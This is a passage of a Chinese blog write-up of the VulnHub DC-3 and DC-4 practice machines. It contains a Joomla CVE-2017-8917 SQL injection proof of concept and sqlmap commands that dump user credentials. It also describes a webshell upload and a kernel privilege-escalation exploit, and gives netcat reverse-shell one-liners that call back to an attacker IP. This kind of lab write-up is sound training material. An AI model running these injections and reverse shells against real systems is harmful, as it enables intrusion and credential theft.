+      <p><img src="/2023/08/03/VulnHub-DC-1/52.png"><br>此时经过验证后我们可以考虑尝试一下yaml-joomla-cve-2017-8917-sqli的poc</p>
+
+        <h2 id="cve-2017-8917-sqli">
+          <a href="#cve-2017-8917-sqli" class="heading-link"><i class="fas fa-link"></i></a><a href="#cve-2017-8917-sqli" class="headerlink" title="cve-2017-8917-sqli"></a>cve-2017-8917-sqli</h2>
+      
+        <h3 id="poc">
+          <a href="#poc" class="heading-link"><i class="fas fa-link"></i></a><a href="#poc" class="headerlink" title="poc"></a>poc</h3>
+      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(2,concat(0x7e,(version())),0)</span><br></pre></td></tr></table></div></figure>
+<p>此时经过poc验证确实存在cve-2017-8917-sqli<br><img src="/2023/08/03/VulnHub-DC-1/35.png"></p>
+
+        <h3 id="payload">
+          <a href="#payload" class="heading-link"><i class="fas fa-link"></i></a><a href="#payload" class="headerlink" title="payload"></a>payload</h3>
+      <p>此时我们采用sqlmap进行注入</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.78.140/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x7e,database()),1)&quot; --dbs</span><br></pre></td></tr></table></div></figure>
+<p><img src="/2023/08/03/VulnHub-DC-1/38.png"></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.78.140/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x7e,database()),1)&quot; -D &quot;joomladb&quot; --tables</span><br></pre></td></tr></table></div></figure>
+<p><img src="/2023/08/03/VulnHub-DC-1/39.png"></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.78.140/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x7e,database()),1)&quot; -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns</span><br></pre></td></tr></table></div></figure>
+<p><img src="/2023/08/03/VulnHub-DC-1/40.png"></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.78.140/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x7e,database()),1)&quot; -D &quot;joomladb&quot; -T &quot;#__users&quot; -C name,password --dump</span><br></pre></td></tr></table></div></figure>
+<p><img src="/2023/08/03/VulnHub-DC-1/41.png"></p>
+
+        <h3 id="john破解密码">
+          <a href="#john破解密码" class="heading-link"><i class="fas fa-link"></i></a><a href="#john破解密码" class="headerlink" title="john破解密码"></a>john破解密码</h3>
+      <p>John the Ripper (“JtR”) 是一个非常有用的工具。这是一个快速的密码破解器，适用于Windows和许多Linux系统。它具有很多功能，对于很多密码破解<br>均有奇效。<br><img src="/2023/08/03/VulnHub-DC-1/42.png"><br>登入之后发现没有flag;它提示我们需要获得root权限<br><img src="/2023/08/03/VulnHub-DC-1/43.png"><br>此时我们扫描一下该网站的后台看看还有没有什么资产<br><img src="/2023/08/03/VulnHub-DC-1/44.png"></p>
+
+        <h2 id="getshell">
+          <a href="#getshell" class="heading-link"><i class="fas fa-link"></i></a><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2>
+      
+        <h3 id="文件上传">
+          <a href="#文件上传" class="heading-link"><i class="fas fa-link"></i></a><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3>
+      <p>此时我们来到了管理员的一个后台资产，此时我们根据之前打攻防演练的思路看看有没有地方可以传马儿；此时成功找到一个可以写入文件的入口<br><img src="/2023/08/03/VulnHub-DC-1/45.png"></p>
+
+        <h3 id="反弹shell">
+          <a href="#反弹shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3>
+      <p>此时利用哥斯拉连接之后我们来反弹个shell到攻击机上面</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.78.132 8080&gt;/tmp/f</span><br></pre></td></tr></table></div></figure>
+<p><img src="/2023/08/03/VulnHub-DC-1/46.png"></p>
+
+        <h3 id="交互式shell">
+          <a href="#交互式shell" class="heading-link"><i class="fas fa-link"></i></a><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h3>
+      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></div></figure>
+
+
+        <h2 id="内核提权">
+          <a href="#内核提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h2>
+      <p>此时我们反弹shell并生成交互式shell之后我们先来看一下这个操作系统的详细信息<br><img src="/2023/08/03/VulnHub-DC-1/47.png"><br>此时我们直接到百度上面找内核提权的exp<br><img src="/2023/08/03/VulnHub-DC-1/48.png"><br>先找一个试一试，官网下载下来之后使用webshell管理工具上传到当前目录<br><img src="/2023/08/03/VulnHub-DC-1/49.png"></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unzip  39772.zip</span><br><span class="line">tar -xvf exploit.tar</span><br></pre></td></tr></table></div></figure>
+<p>接下来进行编译</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./compile.sh</span><br></pre></td></tr></table></div></figure>
+<p>执行compile.sh生成新的doubleput程序</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./doubleput</span><br></pre></td></tr></table></div></figure>
+<p><img src="/2023/08/03/VulnHub-DC-1/50.png"><br>此时已经成功提权到root<br><img src="/2023/08/03/VulnHub-DC-1/51.png"></p>
+
+        <h1 id="DC-4">
+          <a href="#DC-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#DC-4" class="headerlink" title="DC-4"></a>DC-4</h1>
+      
+        <h2 id="信息收集-3">
+          <a href="#信息收集-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#信息收集-3" class="headerlink" title="信息收集"></a>信息收集</h2>
+      
+        <h3 id="资产收集">
+          <a href="#资产收集" class="heading-link"><i class="fas fa-link"></i></a><a href="#资产收集" class="headerlink" title="资产收集"></a>资产收集</h3>
+      <p><img src="/2023/08/03/VulnHub-DC-1/53.png"></p>
+
+        <h3 id="端口扫描">
+          <a href="#端口扫描" class="heading-link"><i class="fas fa-link"></i></a><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3>
+      <p><img src="/2023/08/03/VulnHub-DC-1/54.png"><br>此时发现了开了80和22端口，此时的80我们想到web页面攻击，22端口想到ssh</p>
+
+        <h2 id="爆破密码">
+          <a href="#爆破密码" class="heading-link"><i class="fas fa-link"></i></a><a href="#爆破密码" class="headerlink" title="爆破密码"></a>爆破密码</h2>
+      <p>此时进入网页之后是一个登入框并且此时提示我们需要admin才可以登入，此时因为前台没有做任何的处理，所以此时爆破是我门最好的选择；此时成功爆破出密码为happy<br><img src="/2023/08/03/VulnHub-DC-1/55.png"></p>
+
+        <h2 id="RCE">
+          <a href="#RCE" class="heading-link"><i class="fas fa-link"></i></a><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2>
+      <p>此时进去之后发现有一个命令执行的功能，我们抓个包看看是否存在任意命令的执行<br><img src="/2023/08/03/VulnHub-DC-1/56.png"><br>此时发现确实存在任意命令的执行<br><img src="/2023/08/03/VulnHub-DC-1/57.png"></p>
+
+        <h3 id="反弹shell-1">
+          <a href="#反弹shell-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#反弹shell-1" class="headerlink" title="反弹shell"></a>反弹shell</h3>
+      <p>因为存在任意命令的执行，所以此时我们可以反弹个shell到我们的攻击机上方便我们进行下一步的攻击</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.78.132 8080 -e /bin/bash</span><br><span class="line">kali:</span><br><span class="line">nc -lvvp 8080</span><br></pre></td></tr></table></div></figure>
+
+        <h3 id="交互">
+          <a href="#交互" class="heading-link"><i class="fas fa-link"></i></a><a href="#交互" class="headerlink" title="交互"></a>交互</h3>
+      <figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;</span></span><br></pre></td></tr></table></div></figure>
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ END ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">Author: </span><span class="copyright-author__value"><a href="https://hyggevv.github.io">hey</a></span></div><div class="copyright-link"><span class="copyright-link__name">Link: </span><span class="copyright-link__value"><a href="https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/">https://hyggevv.github.io/2023/08/03/VulnHub-DC-1/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">Copyright: </span><span class="copyright-notice__value">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> unless stating additionally</span></div></div><nav class="post-paginator paginator"><div class="paginator-prev"><a class="paginator-prev__link" href="/2023/08/13/%E5%88%9D%E6%8E%A2Linux%E6%8F%90%E6%9D%83/"><span class="paginator-prev__icon"><i class="fas fa-angle-left"></i></span><span class="paginator-prev__text">初探Linux提权</span></a></div><div class="paginator-next"><a class="paginator-next__link" href="/2023/08/01/2022%E8%93%9D%E5%B8%BD%E6%9D%AF%E5%88%9D%E8%B5%9B/"><span class="paginator-prev__text">2022蓝帽杯初赛</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">Catalog</span><span class="sidebar-nav-ov">Overview</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-1"><span class="toc-number">1.</span> <span class="toc-text">
+          DC-1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">
+          信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%84%E4%BA%A7%E6%89%AB%E6%8F%8F"><span class="toc-number">1.1.1.</span> <span class="toc-text">
+          资产扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.2.</span> <span class="toc-text">
+          漏洞发现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">
+          漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E8%B4%A6%E5%AF%86%E6%B3%84%E9%9C%B2"><span class="toc-number">1.3.</span> <span class="toc-text">
+          数据库账密泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh%E7%9A%84%E7%88%86%E7%A0%B4"><span class="toc-number">1.4.</span> <span class="toc-text">
+          ssh的爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SUID%E6%8F%90%E6%9D%83"><span class="toc-number">1.5.</span> <span class="toc-text">
+          SUID提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-2"><span class="toc-number">2.</span> <span class="toc-text">
+          DC-2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-1"><span class="toc-number">2.1.</span> <span class="toc-text">
+          信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%84%E4%BA%A7%E6%89%AB%E6%8F%8F-1"><span class="toc-number">2.1.1.</span> <span class="toc-text">
+          资产扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F"><span class="toc-number">2.1.2.</span> <span class="toc-text">
+          目录扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A1%86%E6%9E%B6%E8%AF%86%E5%88%AB"><span class="toc-number">2.1.3.</span> <span class="toc-text">
+          框架识别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7744%E7%AB%AF%E5%8F%A3%E7%9A%84ssh"><span class="toc-number">2.2.</span> <span class="toc-text">
+          7744端口的ssh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux-Restricted-Shell%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93"><span class="toc-number">2.3.</span> <span class="toc-text">
+          Linux Restricted Shell绕过技巧总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%95%E8%BF%87rbash"><span class="toc-number">2.3.1.</span> <span class="toc-text">
+          绕过rbash</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%B8%80"><span class="toc-number">2.3.1.1.</span> <span class="toc-text">
+          法一</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C"><span class="toc-number">2.3.1.2.</span> <span class="toc-text">
+          法二</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%87%E6%8D%A2%E7%94%A8%E6%88%B7jerry"><span class="toc-number">2.4.</span> <span class="toc-text">
+          切换用户jerry</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#git%E6%8F%90%E6%9D%83"><span class="toc-number">2.5.</span> <span class="toc-text">
+          git提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E9%97%A8"><span class="toc-number">2.5.1.</span> <span class="toc-text">
+          后门</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-3"><span class="toc-number">3.</span> <span class="toc-text">
+          DC-3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-2"><span class="toc-number">3.1.</span> <span class="toc-text">
+          信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%84%E4%BA%A7%E6%89%AB%E6%8F%8F-2"><span class="toc-number">3.1.1.</span> <span class="toc-text">
+          资产扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CMS%E8%AF%86%E5%88%AB"><span class="toc-number">3.1.2.</span> <span class="toc-text">
+          CMS识别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cve-2017-8917-sqli"><span class="toc-number">3.2.</span> <span class="toc-text">
+          cve-2017-8917-sqli</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#poc"><span class="toc-number">3.2.1.</span> <span class="toc-text">
+          poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-number">3.2.2.</span> <span class="toc-text">
+          payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#john%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81"><span class="toc-number">3.2.3.</span> <span class="toc-text">
+          john破解密码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">3.3.</span> <span class="toc-text">
+          getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">3.3.1.</span> <span class="toc-text">
+          文件上传</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.3.2.</span> <span class="toc-text">
+          反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A4%E4%BA%92%E5%BC%8Fshell"><span class="toc-number">3.3.3.</span> <span class="toc-text">
+          交互式shell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83"><span class="toc-number">3.4.</span> <span class="toc-text">
+          内核提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DC-4"><span class="toc-number">4.</span> <span class="toc-text">
+          DC-4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-3"><span class="toc-number">4.1.</span> <span class="toc-text">
+          信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%84%E4%BA%A7%E6%94%B6%E9%9B%86"><span class="toc-number">4.1.1.</span> <span class="toc-text">
+          资产收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">4.1.2.</span> <span class="toc-text">
+          端口扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E5%AF%86%E7%A0%81"><span class="toc-number">4.2.</span> <span class="toc-text">
+          爆破密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">4.3.</span> <span class="toc-text">
+          RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell-1"><span class="toc-number">4.3.1.</span> <span class="toc-text">
+          反弹shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A4%E4%BA%92"><span class="toc-number">4.3.2.</span> <span class="toc-text">
+          交互</span></a></li></ol></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/usually.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">hey</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">110</div><div class="sidebar-ov-state-item__name">Archives</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">Categories</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">0</div><div class="sidebar-ov-state-item__name">Tags</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="Creative Commons" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">You have read </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>hey</span></div><div><span>Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a></span><span> v5.4.2</span><span class="footer__devider">|</span><span>Theme - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.7.0</span></div><div class="busuanzi"><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">Views</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.7.0"></script><script src="/js/stun-boot.js?v=2.7.0"></script><script src="/js/scroll.js?v=2.7.0"></script><script src="/js/header.js?v=2.7.0"></script><script src="/js/sidebar.js?v=2.7.0"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":180,"height":300},"mobile":{"show":true},"log":false});</script></body></html>
